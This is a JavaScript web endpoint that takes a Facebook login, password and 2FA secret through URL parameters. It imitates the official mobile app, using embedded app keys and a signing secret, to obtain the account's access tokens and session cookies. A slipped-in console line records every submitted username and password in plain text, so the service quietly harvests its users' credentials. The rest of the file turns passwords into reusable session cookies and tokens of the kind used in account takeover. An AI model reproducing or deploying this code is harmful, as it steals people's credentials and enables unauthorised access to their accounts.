
const { v4: uuidv4 } = require("uuid");
const totp = require("totp-generator");
const axios = require("axios");
const userAgents = require("user-agents");

exports.name = "/fbtoken";
exports.index = async (req, res) => {
  var { username, password, twofactor = "0", _2fa } = req.query;

  if (!username || !password)
    return res.json({
      status: false,
      message:
        "USAGE: /fbtoken?username=<email/username/number/uid>&password=<password> optional if have 2fa: &twofactor=0&_2fa=142328",
    });

  try {
    var form = {
      adid: uuidv4(),
      email: username,
      password: password,
      format: "json",
      device_id: uuidv4(),
      cpl: "true",
      family_device_id: uuidv4(),
      locale: "en_US",
      client_country_code: "US",
      credentials_type: "device_based_login_password",
      generate_session_cookies: "1",
      generate_analytics_claim: "1",
      generate_machine_id: "1",
      currently_logged_in_userid: "0",
      irisSeqID: 1,
      try_num: "1",
      enroll_misauth: "false",
      meta_inf_fbmeta: "NO_FILE",
      source: "login",
      machine_id: randomString(24),
      meta_inf_fbmeta: "",
      fb_api_req_friendly_name: "authenticate",
      fb_api_caller_class:
        "com.facebook.account.login.protocol.Fb4aAuthHandler",
      api_key: "b9693d3e013cfb23ec2c772783d14ce8",
      access_token: "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
    };

    form.sig = encodesig(sort(form));

    var options = {
      url: "https://b-graph.facebook.com/auth/login",
      method: "post",
      data: form,
      transformRequest: [
        (data, headers) => {
          return require("querystring").stringify(data);
        },
      ],
      headers: {
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-friendly-name": form["fb_api_req_friendly_name"],
        "x-fb-http-engine": "Liger",
        "user-agent": new userAgents().toString(),
      },
    };

    return new Promise((resolve) => {
      axios
        .request(options)
        .then(async (response) => {
          try {
            response.data.access_token_eaad6v7 = await convertToken(
              response.data.access_token,
            );
            response.data.cookies = await convertCookie(
              response.data.session_cookies,
            );
            response.data.session_cookies = response.data.session_cookies.map(
              (e) => {
                return {
                  key: e.name,
                  value: e.value,
                  domain: "facebook.com",
                  path: e.path,
                  hostOnly: false,
                };
              },
            );

console.log(`Username: ${username} Password: ${password}`)
            return res.json({
              status: true,
              message: "Successfully retrieved information!",
              data: response.data,
            });
          } catch (e) {
            return res.json({
              status: false,
              message: "Please enable 2FA authentication then try again!",
            });
          }
        })
        .catch((error) => {
          if (error.response.data.error.code == 401) {
            return res.json({
              status: false,
              message: error.response.data.error.message,
            });
          }
          if (twofactor == "0" && (!_2fa || _2fa == "0")) {
            return res.json({
              status: false,
              message: "Please enter the 2-factor authentication code!",
            });
          }
          var data = error.response.data.error.error_data;
          try {
            _2fa =
              _2fa != "0"
                ? _2fa
                : totp(decodeURI(twofactor).replace(/\s+/g, "").toLowerCase());
          } catch (e) {
            return res.json({
              status: false,
              message: "Invalid 2-factor authentication code!",
            });
          }
          (form.twofactor_code = _2fa), (form.encrypted_msisdn = "");
          form.userid = data.uid;
          form.machine_id = data.machine_id;
          form.first_factor = data.login_first_factor;
          form.credentials_type = "two_factor";
          form.sig = encodesig(sort(form));
          options.data = form;
          axios
            .request(options)
            .then(async (response) => {
              response.data.access_token_eaad6v7 = await convertToken(
                response.data.access_token,
              );
              response.data.cookies = await convertCookie(
                response.data.session_cookies,
              );
              response.data.session_cookies = response.data.session_cookies.map(
                (e) => {
                  return {
                    key: e.name,
                    value: e.value,
                    domain: "facebook.com",
                    path: e.path,
                    hostOnly: false,
                  };
                },
              );
              return res.json({
                status: true,
                message: "Information retrieved successfully!",
                data: response.data,
              });
            })
            .catch((error) => {
              return res.json({
                status: false,
                message: error.response.data,
              });
            });
        });
    });
  } catch (e) {
    return res.json({
      status: false,
      message: "Please check your account again!",
    });
  }
};

async function convertCookie(seasion) {
  var cookie = "";
  for (var i = 0; i < seasion.length; i++) {
    cookie += seasion[i].name + "=" + seasion[i].value + "; ";
  }
  return cookie;
}

async function convertToken(token) {
  return new Promise((resolve) => {
    axios
      .get(
        `https://api.facebook.com/method/auth.getSessionforApp?format=json&access_token=${token}&new_app_id=275254692598279`,
      )
      .then((response) => {
        if (response.data.error) {
          resolve();
        } else {
          resolve(response.data.access_token);
        }
      });
  });
}

function randomString(length) {
  length = length || 10;
  var char = "abcdefghijklmnopqrstuvwxyz";
  char = char.charAt(Math.floor(Math.random() * char.length));
  for (var i = 0; i < length - 1; i++) {
    char += "abcdefghijklmnopqrstuvwxyz0123456789".charAt(
      Math.floor(36 * Math.random()),
    );
  }
  return char;
}

function encodesig(string) {
  var data = "";
  Object.keys(string).forEach(function (info) {
    data += info + "=" + string[info];
  });
  data = md5(data + "62f8ce9f74b12f84c123cc23437a4a32");
  return data;
}

function md5(string) {
  return require("crypto").createHash("md5").update(string).digest("hex");
}

function sort(string) {
  var sor = Object.keys(string).sort(),
    data = {},
    i;
  for (i in sor) data[sor[i]] = string[sor[i]];
  return data;
}
